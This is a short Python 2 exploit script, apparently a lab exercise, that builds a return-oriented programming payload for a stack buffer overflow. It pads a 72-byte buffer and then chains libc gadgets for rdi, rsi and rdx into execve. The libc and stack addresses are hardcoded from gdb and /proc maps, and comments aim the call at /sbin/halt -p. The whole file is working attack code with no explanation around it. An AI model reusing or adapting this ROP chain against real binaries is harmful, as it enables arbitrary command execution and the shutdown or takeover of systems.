from struct import pack

# Command used to extract these addresses
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdx

buff_base = 0x7fffffffdcf0

# gdb vic... b main
# cat /proc/4361/maps | grep libc
base = 0x7ffff79e4000
rdi = 0x2155f  # First Argument
rsi = 0x23e6a  # Second Argument
rdx = 0x1b96  # Third Argument
execve = 0xe4e30

rdi = int(hex(base+rdi), 16)
rsi = int(hex(base+rsi), 16)
rdx = int(hex(base+rdx), 16)
execve = int(hex(base+execve), 16)
# print type(rdi)
print rdi, rsi, rdx, execve
# rdi, rsi, rdx, execve = 0x7ffff7a0555f, 0x7ffff7a07e6a, 0x7ffff79e5b96, 0x7ffff7ac8e30
# Fill Buffer with NULL bytes
buff = "\x00" * 72

# update Return Address with gadget 1
buff += pack ("<Q", rdi)
# print buff

# Address of /sbin/halt
buff += pack("<Q", int(hex(buff_base), 16) + int(hex(72+(8)*7), 16))

buff += pack("<Q", rsi)
buff += pack("<Q", int(hex(buff_base), 16) + int(hex(72+(8)*8), 16))

buff += pack("<Q", rdx)
buff += pack("<Q", int(hex(buff_base), 16) + int(hex(72+(8)*9), 16))

buff += pack("<Q", execve)

buff += "A" * 8
buff += "B" * 8
# buff += "/sbin/halt"
# buff += "-p"
buff += "\x00" * 8

print buff